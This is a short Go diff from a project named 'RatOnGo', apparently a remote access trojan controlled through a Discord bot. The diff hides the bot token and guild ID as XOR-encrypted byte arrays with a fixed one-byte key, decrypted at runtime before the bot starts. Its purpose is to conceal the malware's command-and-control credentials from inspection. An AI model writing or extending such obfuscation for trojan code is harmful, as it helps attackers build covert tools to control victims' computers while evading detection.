@@ -4,15 +4,26 @@ import (
 	"RatOnGo/discord"
 )
 
-const (
-	DiscordToken = "YOUR_BOT_TOKEN_HERE"
-	GuildID      = "YOUR_GUILD_ID_HERE"
-)
+var key byte = 0x5A
+
+var encryptedToken = []byte{YOUR_ENCRYPTED_TOKEN_HERE}
+var encryptedGuildID = []byte{YOUR_ENCRYPTED_GUILDID_HERE}
+
+func xorDecrypt(data []byte, key byte) string {
+	res := make([]byte, len(data))
+	for i := range data {
+		res[i] = data[i] ^ key
+	}
+	return string(res)
+}
 
 func main() {
-	if DiscordToken == "" || GuildID == "" {
+	token := xorDecrypt(encryptedToken, key)
+	guildID := xorDecrypt(encryptedGuildID, key)
+
+	if token == "" || guildID == "" {
 		return
 	}
 
-	discord.StartBot(DiscordToken, GuildID)
+	discord.StartBot(token, guildID)
 }
